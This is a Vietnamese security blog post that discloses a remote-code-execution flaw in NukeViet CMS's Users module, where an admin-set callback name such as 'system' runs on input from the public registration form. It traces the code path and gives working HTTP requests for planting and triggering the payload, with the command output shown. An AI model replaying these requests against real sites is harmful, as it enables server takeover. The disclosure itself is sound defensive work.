---
layout: post
title: "Arbitrary PHP Function Call dẫn tới RCE (NukeViet)"
date: 2026-08-30 00:00:00 +0700
categories: [Security, PHP, RCE]
---

> Tài liệu này mô tả một lỗ hổng Remote Code Execution (RCE) được phát hiện trong Module của NukeViet CMS, khai thác qua cơ chế `match_type=callback` trên trường dữ liệu tùy chỉnh (custom field). Mọi thử nghiệm được thực hiện trên môi trường lab/local do chính người viết triển khai — không nhắm vào hệ thống production của bên thứ ba.


## [](#header-0) Bug này hoạt động thế nào — giải thích không thuật ngữ

Module Users cho admin tạo **"trường dữ liệu tùy chỉnh"** khi đăng ký (ví dụ: thêm ô "Số CMND"). Với mỗi trường, admin chọn cách kiểm tra dữ liệu người dùng nhập, gọi là `match_type`. Có một kiểu là **`callback`**: admin gõ **tên một hàm PHP** vào ô cấu hình, hệ thống sẽ gọi hàm đó để kiểm tra giá trị người dùng nhập.

Ý định thiết kế: admin gõ tên hàm validator do chính họ viết, ví dụ `nv_check_phone_number`. Nhưng hệ thống **chỉ kiểm tra hàm đó có tồn tại hay không** (`function_exists()`), không kiểm tra hàm đó có phải một validator "an toàn" hay không. Mọi hàm PHP có sẵn của ngôn ngữ đều "tồn tại" — kể cả `system`, `exec`, `shell_exec` (các hàm chạy lệnh hệ điều hành).

Bug xảy ra qua **2 giai đoạn**, cần phân biệt rõ ai làm gì:

| Giai đoạn | Ai thực hiện | Hành động | Quyền cần |
|---|---|---|---|
| **1. Poison** | Admin quản trị module Users | Tạo field mới, đặt tên hàm callback = `system` | Chỉ cần quyền quản trị module Users (không cần GodAdmin) |
| **2. Trigger** | **Bất kỳ ai**, kể cả khách vãng lai chưa có tài khoản | Vào trang đăng ký công khai, gõ lệnh shell vào đúng ô field đó | Không cần quyền gì |

```
[Giai đoạn 1 — 1 lần, cần admin]
Admin → POST /admin/index.php?nv=users&op=fields  (tạo field, func_callback = "system")
                                          │
                                          ▼
                          DB: users_field.func_callback = "system"
                                          │
[Giai đoạn 2 — lặp lại được bởi bất kỳ ai, mãi mãi cho đến khi bị xoá]
Khách vãng lai → POST /index.php?op=register
                    custom_fields[nv_poc_rce] = "id"
                                          │
                                          ▼
                 server chạy:  call_user_func("system", "id")
                            =  system("id")     ← RCE thật
```

Vì sao nghiêm trọng dù bước 1 cần quyền admin?

- Một admin module Users **bình thường không có quyền chạm server** — chỉ quản lý user. Bug này giúp họ **tự nâng quyền lên chạy lệnh bất kỳ trên toàn server**, vượt xa thiết kế phân quyền ban đầu (privilege escalation).
- Nếu tài khoản admin module Users đó từng bị lộ (phishing, XSS, dò mật khẩu yếu...), kẻ tấn công có được RCE toàn server mà không cần chiếm GodAdmin.
- Sau khi gài xong, bẫy **tồn tại vĩnh viễn**, ai cũng kích hoạt được qua trang đăng ký công khai, không cần tài khoản.

## [](#header-1) Tóm tắt

| Trường | Giá trị |
|---|---|
| Mức độ | **High** |
| CWE | CWE-749 (Exposed Dangerous Method/Function) / CWE-94 (Code Injection) |
| Loại | Arbitrary PHP function call → Remote Code Execution |
| Vai trò cần có | Admin quản trị module `users` (mod-admin cấp module, **không cần** GodAdmin/SPAdmin) |
| Impact | Toàn bộ server — RCE dưới quyền tiến trình PHP/web server |
| File lưu payload | `modules/users/admin/fields.php` |
| File thực thi payload | `modules/users/fields.check.php` |

## [](#header-2) Sink-to-source

# Data Flow: `func_callback` → `call_user_func()`

Đã xác minh trên code hiện tại của NukeViet. Luồng dữ liệu được trace theo hướng **Sink → Source** như sau:

```text
[SINK — Dynamic Function Call]
modules/users/fields.check.php

    } elseif ($row_f['match_type'] == 'callback') {
        if (function_exists($row_f['func_callback'])) {
            if (!call_user_func($row_f['func_callback'], $value)) {

    └─ $row_f['func_callback'] được sử dụng trực tiếp
       làm callable cho call_user_func()
```


![](/blog/assets/field.png)


Từ sink, trace ngược `$row_f['func_callback']` về nơi cấu hình:

```text
[Stored Configuration]
modules/users/admin/fields.php

    └─ func_callback được lưu vào {prefix}_users_field
       khi tạo mới custom field (fid=0)
```

![](/blog/assets/field2.png)
        


```text
        │
        ▼

[Source — Admin cấu hình callback]
modules/users/admin/fields.php

    $dataform['func_callback'] =
        ($dataform['match_type'] == 'callback')
            ? $nv_Request->get_string('match_callback', 'post', '', false)
            : '';

    └─ match_callback → func_callback
    └─ Chỉ kiểm tra function_exists()
    └─ Không có allowlist
```

![](/blog/assets/field1.png)

Execution path để kích hoạt sink:

```text
[User Registration]
modules/users/funcs/register.php

    $custom_fields = $nv_Request->get_array('custom_fields', 'post');
```

![](/blog/assets/custom.png)

```text

        │
        ▼
modules/users/funcs/register.php

    require NV_ROOTDIR . '/modules/users/fields.check.php';

```


![](/blog/assets/custom1.png)

```text

        │
        ▼
modules/users/fields.check.php

    $value = (isset($custom_fields[$row_f['field']]))
        ? $custom_fields[$row_f['field']]
        : '';

        └─ $value được truyền vào callback tại sink


```

![](/blog/assets/custom2.png)


Ngoài registration, cùng sink còn được sử dụng qua:

```text
modules/users/funcs/editinfo.php
modules/users/admin/user_add.php
```

vì các flow này đều `require modules/users/fields.check.php`.


## [](#header-3) Điều kiện khai thác

1. Có tài khoản admin với quyền quản trị module **Users** (không cần GodAdmin/SPAdmin).
2. `$global_config['allowuserreg']` khác `0` (cho phép đăng ký) — mặc định NukeViet bật (`register.php`).
3. Đặt `field_type = textbox` khi tạo field — nhánh `match_type=callback` chỉ tồn tại trong `textbox|textarea|editor` (`fields.php`).
4. Tên field không được trùng cột có sẵn trong bảng `{prefix}_users_info` và không nằm trong blocklist `includes/field_not_allow.php`.

## [](#header-4) Khai thác — Giai đoạn 1: Poison

Admin tạo field mới (`fid=0`, **không phải sửa field có sẵn**) với payload dạng:

```http
POST /admin/index.php?language=vi&nv=users&op=fields HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 456
Origin: http://127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1:8080/admin/index.php?nv=users&op=fields
Cookie: <cookie>
Connection: keep-alive

save=1&fid=0&system=0&title=PoC+RCE&description=PoC&required=0&show_register=1&user_editable=1&show_profile=1&class=&field_type=textbox&field=nv_poc_rce&match_type=callback&match_callback=system&min_length=0&max_length=100&default_value=
```

![](/blog/assets/add.png)

![](/blog/assets/checking.png)






| Tham số          | Giá trị      | Vì sao                                                                                                                                                                     |
| ---------------- | ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `fid`            | `0`          | **Bắt buộc.** `fid = 0` cho biết đây là request **tạo field mới**. Nếu khác `0`, server coi đây là request **sửa field đã tồn tại** và lấy lại `field`/`field_type` từ DB. |
| `field`          | `nv_poc_rce` | Tên của field mới. Server đọc trực tiếp tham số `field` để đặt tên field, **không phải `fieldid`**.                                                                        |
| `field_type`     | `textbox`    | Loại field. Được gửi cùng request để server xử lý cấu hình field.                                                                                                          |
| `match_type`     | `callback`   | Kích hoạt nhánh `callback`, từ đó server lưu giá trị `match_callback` vào `func_callback`.                                                                                 |
| `match_callback` | `system`     | Tên hàm PHP được lưu vào `func_callback`. Đây là hàm có khả năng thực thi lệnh hệ thống khi được gọi thông qua cơ chế callback.                                            |


Response mong đợi: `301 Moved Permanently` redirect về trang danh sách field (`fields.php`) — nghĩa là INSERT thành công.

**Lưu ý quan trọng khi tái tạo:** nếu bấm "Sửa" một field có sẵn thay vì "Thêm trường mới" (`fid` khác 0), server sẽ **ghi đè** `field_type` từ DB (`fields.php`):

```php
$dataform['field_type'] = $dataform_old['field_type'];       // lấy từ DB, không lấy từ POST
$dataform['field'] = $dataform['fieldid'] = $dataform_old['field'];
```

Nếu field cũ vốn là kiểu "lựa chọn" (dropdown/checkbox), code sẽ ép cứng `match_type='none'`, `func_callback=''` (`fields.php`) — dù request có gửi `match_type=callback` cũng bị xoá âm thầm trước khi ghi DB. Request vẫn trả `302` bình thường nên dễ nhầm là đã thành công. Bắt buộc phải tạo field mới (`fid=0`) từ đầu, không thể "biến hình" field có sẵn.

## [](#header-5) Khai thác — Giai đoạn 2: Trigger

Bất kỳ ai — kể cả người dùng chưa có tài khoản — gửi request đăng ký với field vừa bị gài bẫy:

```
POST /index.php/en/users/register/ HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 300
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/index.php/en/users/register/
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq; nv4_ctr=MTI3XzBfMF8xLlpa; nv4_cltz=420.420.420%257C%252F%257C; nv4_int_lang=pOxnN8G_Y2oE8WkMeO5ZaA%2C%2C; nv4_data_lang=nm4mM0iUHCjIeKvQXUH07A%2C%2C; nv4_statistic_vi=UBvGwCykzSgyccgMyKVTdg%2C%2C; nv4_nvvithemever=uT11mKuPK7N0yvymMZ3phA%2C%2C; nv4_cltn=QXNpYS9CYW5na29rLjI1MjAwLjA%3D; nv4_sess=3a7c37e4920abcaeab8448f88be01f15; nv4_u_lang=pOxnN8G_Y2oE8WkMeO5ZaA%2C%2C; nv4_statistic_en=k3GL5m1flaMTyFg0Z2rVSQ%2C%2C; nv4_nventhemever=uT11mKuPK7N0yvymMZ3phA%2C%2C
Connection: keep-alive

first_name=tesst&last_name=test&username=test01&email=hust1212%40gmail.com&password=Password123%40!&re_password=Password123%40!&gender=M&birthday=23%2F08%2F1985&sig=test&question=test&answer=test&custom_fields%5Bnv_poc_rce%5D=id&agreecheck=1&nv_seccode=2DC76F&checkss=b381411c8c8e6f6ccc860e3bbdf50517
```

![](/blog/assets/rce.png)

Server thực thi:

```php
call_user_func('system', 'id');   // = system('id')
```

Vì đây là endpoint `nv_jsonOutput()` không có buffering, output của `system()` được in **trực tiếp**, xuất hiện ở đầu body response, **trước** phần JSON `{"status":...}` — ví dụ:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data){"status":...}
```

Đây chính là bằng chứng RCE.

## [](#header-6) Impact tổng hợp

- **Remote Code Execution** dưới quyền tiến trình web server, kích hoạt lặp lại vô hạn lần bởi bất kỳ ai truy cập trang đăng ký công khai.
- **Privilege escalation**: một tài khoản chỉ có quyền quản trị module Users (không phải GodAdmin) có thể tự nâng quyền lên chạy lệnh hệ thống tuỳ ý.
- **Persistence**: bẫy tồn tại vĩnh viễn trong DB cho tới khi bị phát hiện và xoá thủ công — không để lại dấu vết bất thường nào trong luồng vận hành bình thường của admin panel.
- Cùng sink còn bị kích hoạt qua luồng sửa hồ sơ (`editinfo.php`) và admin tạo user hộ (`user_add.php`), mở rộng bề mặt tấn công.


## [](#header-8) Kết luận

Lỗ hổng này là một ví dụ điển hình của **CWE-749 (Exposed Dangerous Method or Function)**: một tính năng hợp pháp (cho phép admin định nghĩa validator tuỳ chỉnh) bị lạm dụng vì thiếu allowlist ở lớp kiểm tra đầu vào. Điểm đáng chú ý là chuỗi khai thác đòi hỏi hai vai trò khác nhau — admin module để "gài bẫy" và bất kỳ ai để "kích nổ" — khiến bug dễ bị đánh giá thấp mức độ nghiêm trọng nếu chỉ nhìn riêng lẻ từng bước mà không truy vết toàn bộ luồng source-to-sink.

## 🔗 PoC & Source Code

PoC được xây dựng để tái hiện lỗ hổng trên môi trường **Lab/Authorized Pentest**, bao gồm script tự động đăng nhập, tạo custom field và kích hoạt callback.

* **Repository:** [NukeViet-RCE-PoC](https://github.com/0xki29/NukeViet-RCE-PoC?utm_source=chatgpt.com)
* **Exploit:** `exploit.py`
* **Affected version:** NukeViet `<= 4.5.09`

> ⚠️ Chỉ sử dụng PoC trên hệ thống thuộc quyền sở hữu hoặc được cấp phép kiểm thử.

